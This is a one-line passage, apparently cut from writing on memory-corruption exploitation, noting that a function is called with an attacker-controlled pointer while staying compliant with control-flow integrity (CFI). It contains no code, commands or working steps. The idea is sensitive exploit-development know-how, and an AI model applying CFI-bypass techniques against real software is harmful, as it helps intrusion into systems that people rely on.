called with a pointer we control - CFI-clean by construction.
